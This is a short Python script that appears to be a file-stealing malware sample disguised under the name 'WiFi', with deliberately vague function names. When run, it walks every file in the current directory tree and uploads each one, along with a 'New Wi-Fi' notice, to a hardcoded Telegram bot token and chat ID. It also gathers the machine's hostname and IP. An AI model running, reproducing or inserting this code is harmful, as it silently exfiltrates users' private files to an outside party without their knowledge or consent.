import os
import requests
import socket

unknownTok = '7458350693:AAGJ2HxxhAT3qKh7RP18mvO6x4UjZBgcHGI'
unknownID = '6066525202'
unknown_file = []
my_name = ""

def unknown2():
    global unknown_file

    files = []
    for root, dirs, files_in_dir in os.walk("."):
        for file in files_in_dir:
            file_path = os.path.join(root, file)
            if not file_path.endswith('.zip') and file_path not in unknown_file:
                files.append(file_path)
    for file_path in files:
        unknown_file.append(file_path)
        send_to_telegram(file_path)

def unknown4():
    unknownDv = socket.gethostname()
    unknownip = socket.gethostbyname(unknownDv)
    return unknownDv, unknownip

def unknown5(unknownPas, unknownDv, unknownip):
    message = f"New Wi-Fi"
    url = f"https://api.telegram.org/bot{unknownTok}/sendMessage"
    data = {"chat_id": unknownID, "text": message}
    response = requests.post(url, data=data)

def unknown6(unknownFile):
    if os.path.exists(unknownFile):
        url = f"https://api.telegram.org/bot{unknownTok}/sendDocument"
        with open(unknownFile, "rb") as document:
            files = {"document": document}
            data = {"chat_id": unknownID}
            response = requests.post(url, files=files, data=data)

def send_to_telegram(unknownFile):
    if os.path.exists(unknownFile):
        url = f"https://api.telegram.org/bot{unknownTok}/sendDocument"
        with open(unknownFile, "rb") as document:
            files = {"document": document}
            data = {"chat_id": unknownID}
            response = requests.post(url, files=files, data=data)

def WiFi():
    unknown2()
    unknownDv, unknownip = unknown4()
    unknown5("", unknownDv, unknownip)

if __name__ == "__main__":
    WiFi()
